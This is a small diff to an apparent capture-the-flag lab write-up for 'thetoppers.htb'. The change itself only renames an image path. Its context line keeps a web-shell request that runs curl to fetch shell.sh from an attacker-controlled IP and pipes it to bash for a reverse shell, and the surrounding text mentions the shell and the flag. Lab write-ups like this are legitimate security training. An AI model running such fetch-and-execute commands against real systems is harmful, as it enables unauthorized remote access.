@@ -170,7 +170,7 @@ http://thetoppers.htb/shell.php?cmd=curl%20%3C10.10.14.119%3E:8081/shell.sh|bash
 
 We now can see our reverse shell:
 
-<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 Now we can locate the flag and cat it's contents
 
